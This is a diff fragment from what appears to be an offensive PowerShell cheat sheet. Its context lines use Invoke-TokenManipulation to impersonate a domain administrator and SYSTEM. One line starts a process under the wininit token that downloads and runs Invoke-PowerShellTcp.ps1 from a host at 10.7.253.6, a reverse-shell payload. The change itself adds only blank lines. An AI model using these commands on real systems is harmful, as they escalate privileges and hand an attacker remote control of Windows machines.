@@ -16,3 +16,5 @@ Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
+
+
